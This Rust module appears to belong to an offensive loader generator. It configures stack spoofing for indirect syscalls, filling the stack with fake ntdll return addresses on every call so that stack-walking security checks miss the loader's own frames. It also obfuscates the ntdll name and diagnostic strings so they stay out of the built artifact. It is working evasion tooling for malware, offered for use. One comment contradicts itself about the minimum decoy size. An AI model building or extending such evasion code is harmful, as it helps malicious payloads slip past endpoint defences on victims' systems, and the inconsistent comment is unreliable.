//! Stack spoofing for the syscall layer.
//!
//! Indirect syscalls put the *instruction pointer* inside ntdll for the duration
//! of the syscall, but the *stack* still shows the loader's own frames. This
//! block replaces the top of the stack with a run of plausible ntdll code
//! addresses before every syscall, so a checker that walks the stack during the
//! call no longer sees the stub.
//!
//! It is a property of `build.stub.syscalls`, not a `runtime:` step: it rewrites
//! the trampoline (`nt_invoke`) every `nt_*` helper calls, and `init_syscalls`
//! installs it before the runner starts. See the loader-feature README at
//! `src/features/stack_spoofing/README.md` for the full write-up, including what
//! this does *not* hide.

use serde::{Deserialize, Serialize};

use crate::engine::obfuscation::StringsConfig;

/// The generated block: a `nt_invoke` replacement injected into the syscall
/// layer.
const BLOCK: &str = include_str!("stub_fragment.rs");

/// Lower bound of `decoy_bytes`: the fabricated frames live between the new
/// stack pointer and the first copied argument, so the shift has to be at least
/// as large as the argument area (`0x70`) — and measurably a little more: on the
/// verification host every shift below `0x80` faults while `0x80` and above work,
/// so `0x80` is the floor (see the README's bisect table for the numbers).
pub const MIN_DECOY_BYTES: usize = 0x80;

/// Upper bound of `decoy_bytes`: 32 KB of decoy per syscall is already far more
/// than any stack walker reads, and every byte is rewritten on every call.
pub const MAX_DECOY_BYTES: usize = 0x8000;

/// Parameters for stack spoofing.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub struct Params {
    /// How many bytes of decoy stack to fabricate below the real stack pointer
    /// on every syscall.
    ///
    /// `0x1000` (4 KB, the default) buries the loader's real frames under a page
    /// of ntdll-shaped return addresses, and a page is also the smallest value
    /// measured to work (`0x80`; see the README). Clamped to
    /// [`MIN_DECOY_BYTES`]..=[`MAX_DECOY_BYTES`] and rounded down to a multiple
    /// of 16.
    #[serde(default = "default_decoy_bytes")]
    pub decoy_bytes: usize,
}

impl Default for Params {
    /// Defaults to a page of decoy stack per syscall.
    ///
    /// The manual impl keeps `Params::default()` and the `serde` field default
    /// in step: a block with no fields gets the default struct, not the
    /// field-level default.
    fn default() -> Self {
        Self {
            decoy_bytes: default_decoy_bytes(),
        }
    }
}

/// Default of [`Params::decoy_bytes`].
pub fn default_decoy_bytes() -> usize {
    0x1000
}

/// Runtime diagnostics the fragment can emit, as `(placeholder, plaintext)`
/// pairs.
///
/// `render_fragment` replaces each placeholder with code that rebuilds the text
/// at run time (using `strings`'s active strategy), so no diagnostic lands in
/// the artifact's `.rdata`.
const MESSAGES: &[(&str, &str)] = &[
    (
        "$MSG_INIT_FAILED$",
        "could not read the native library while preparing the stack",
    ),
    (
        "$MSG_NO_FRAMES$",
        "could not find enough plausible return addresses in the native library",
    ),
];

impl Params {
    /// Renders the stack-spoofing block for these parameters.
    ///
    /// Only the ntdll name and the diagnostics go through the obfuscator; the
    /// fabricated addresses are discovered at run time and never appear in the
    /// artifact.
    pub fn render_fragment(&self, strings: &StringsConfig) -> String {
        let ntdll_def = strings
            .obfuscate("ntdll.dll")
            .render_stub_expr("stack_spoofing_ntdll");
        let decoy = self.clamped_decoy_bytes();

        let mut rendered = BLOCK.to_string();
        for (index, (placeholder, text)) in MESSAGES.iter().enumerate() {
            rendered = rendered.replace(
                placeholder,
                &strings
                    .obfuscate(text)
                    .render_stub_expr(&format!("stack_spoofing_msg_{index}")),
            );
        }
        rendered
            .replace("$SPOOF_NTDLL_DEF$", &ntdll_def)
            .replace("$DECOY_BYTES$", &decoy.to_string())
    }

    /// `decoy_bytes` clamped to the supported range and 16-byte aligned.
    pub fn clamped_decoy_bytes(&self) -> usize {
        let clamped = self.decoy_bytes.clamp(MIN_DECOY_BYTES, MAX_DECOY_BYTES);
        clamped & !0xf
    }
}

#[cfg(test)]
mod tests;
